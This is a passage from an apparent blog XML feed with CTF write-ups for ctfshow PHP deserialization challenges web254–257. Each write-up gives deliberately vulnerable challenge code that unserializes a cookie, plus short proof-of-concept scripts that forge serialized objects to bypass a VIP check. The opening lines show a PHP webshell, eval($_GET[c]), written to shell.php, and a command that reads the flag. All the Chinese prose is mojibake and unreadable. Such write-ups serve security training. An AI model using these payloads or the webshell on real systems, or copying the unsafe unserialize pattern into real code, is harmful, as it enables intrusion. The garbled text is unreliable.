eval($_GET[c]);?&gt;&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336273546-c62d1e21-eb3a-4b1f-bf3d-a465da571d9a.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336273546-c62d1e21-eb3a-4b1f-bf3d-a465da571d9a.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>URLç¼–ç ä¸€ä¸‹ <code>_</code> åé¢çš„å†…å®¹</p><p>é»˜è®¤ç”Ÿæˆçš„ webshell åœ¨ <code>shell.php</code> ä¸­</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336584841-57607e0e-bc57-4150-b438-687be09da1b6.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336584841-57607e0e-bc57-4150-b438-687be09da1b6.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>å‘çš„åŒ…ä¼šè¶…æ—¶ï¼Œä¸è¿‡æ²¡äº‹ï¼Œ<code>shell.php</code> æ˜¯ä¼šç”Ÿæˆçš„ã€‚</p><p>æœ€å <code>cat /flaaag</code> å³å¯</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336665246-42e4102e-d001-4430-aa7e-08d630b511cb.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1619336665246-42e4102e-d001-4430-aa7e-08d630b511cb.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><hr><p><strong>ä¸€äº›å‚è€ƒçš„é¢˜è§£</strong></p><p><a href="https://www.freebuf.com/articles/web/263512.html">https://www.freebuf.com/articles/web/263512.html</a></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> ctfshow </category>
          
          <category> ctfç»ƒä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> ctfshow </tag>
            
            <tag> ctfç»ƒä¹  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow ååºåˆ—åŒ–ç¯‡</title>
      <link href="2021/04/06/ctfshow-unserialize/"/>
      <url>2021/04/06/ctfshow-unserialize/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>æ„Ÿè§‰æ’åºä¸æ˜¯å¾ˆå‹å¥½..å› ä¸ºéš¾åº¦ä¸æ˜¯ç›¸å¯¹é€’å¢çš„</p><p>å»ºè®®é¡ºåº web254-258ã€web260ã€web262-web266ã€web259ã€web261ã€web275-276</p><p>ç„¶å web277-278 æ˜¯ Python ååºåˆ—åŒ–ï¼Œä¸è¿‡æ¯”è¾ƒç®€å•</p><p>æœ€åæ˜¯ web267-web274 éƒ½æ˜¯æ¡†æ¶çš„ååºåˆ—åŒ–æ¼æ´ï¼Œåˆ†æèµ·æ¥ä¼šéº»çƒ¦äº›</p><p>web267-270 æ˜¯ Yii çš„ CVE å’Œ ç»•è¿‡ï¼Œweb271-273 æ˜¯ Laravel 5.7 å’Œ 5.8 çš„ååºåˆ—åŒ–ï¼Œ</p><p>web274æ˜¯ thinkphp5.1 çš„ååºåˆ—åŒ–</p><p>æ¡†æ¶çš„ååºåˆ—åŒ–æœ‰ç©ºä¼šï¼ˆå’•å’•é¢„è®¢â€¦ï¼‰é¢å¤–å†™æ–‡ç« å¤ç°ï¼Œ23333</p><h2 id="web254-PHPç±»ç®€å•è®¤è¯†"><a href="#web254-PHPç±»ç®€å•è®¤è¯†" class="headerlink" title="web254 PHPç±»ç®€å•è®¤è¯†"></a>web254 PHPç±»ç®€å•è®¤è¯†</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255-ç®€å•é€»è¾‘"><a href="#web255-ç®€å•é€»è¾‘" class="headerlink" title="web255 ç®€å•é€»è¾‘"></a>web255 ç®€å•é€»è¾‘</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å³è¦æ»¡è¶³</p><ul><li>ç±»æˆå‘˜ <code>isVip</code> ä¸º <code>true</code></li><li>ä¼ å…¥çš„ <code>username</code> å’Œ ç±»æˆå‘˜ <code>username</code> ç›¸ç­‰</li><li>ä¼ å…¥çš„ <code>password</code> å’Œ ç±»æˆå‘˜ <code>password</code> ç›¸ç­‰</li></ul><p>username å’Œ password å·²çŸ¥ï¼Œååºåˆ—åŒ–ä¿®æ”¹ <code>isVip</code> å³å¯</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$user</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609858827-cb7aea08-34e9-4b27-b7d2-01a64db413bf.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609858827-cb7aea08-34e9-4b27-b7d2-01a64db413bf.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web256-ç®€å•é€»è¾‘"><a href="#web256-ç®€å•é€»è¾‘" class="headerlink" title="web256 ç®€å•é€»è¾‘"></a>web256 ç®€å•é€»è¾‘</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 19:29:02</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username!==<span class="keyword">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;checkVip())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;vipOneKeyGetFlag();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ†æï¼š</p><p>å³è¦æ»¡è¶³</p><ul><li>ç±»æˆå‘˜ <code>isVip</code> ä¸º true</li><li>ä¼ å…¥çš„ <code>username</code> å’Œ ç±»æˆå‘˜ <code>username</code> ç›¸ç­‰</li><li>ä¼ å…¥çš„ <code>password</code> å’Œ ç±»æˆå‘˜ <code>password</code> ç›¸ç­‰</li><li>ç±»çš„ username å’Œ password ä¸ç­‰ï¼ˆåŸæ¥æ˜¯ç›¸ç­‰çš„ï¼‰</li></ul><p>å› ä¸ºé€šè¿‡ååºåˆ—åŒ–ä¿®æ”¹åŸæœ‰æ•°æ®å³å¯</p><p>poc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="variable">$user</span>-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="string">&#x27;6&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609996575-52aae14a-9b59-4ca8-ac3b-6a44c3929973.png?x-oss-process=image/resize,w_1500" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/2789727/1617609996575-52aae14a-9b59-4ca8-ac3b-6a44c3929973.png?x-oss-process=image/resize,w_1500" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="web257-ç®€å•POPé“¾"><a href="#web257-ç®€å•POPé“¾" class="headerlink" title="web257 ç®€å•POPé“¾"></a>web257 ç®€å•POPé“¾</h2><span class='btn'><a class="button"  title='nginx/1.16.1'><i class='fas fa-tag'></i>nginx/1.16.1</a></span> <span class='btn'><a class="button"  title='PHP/7.3.11'><i class='fas fa-tag'></i>PHP/7.3.11</a></span><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span 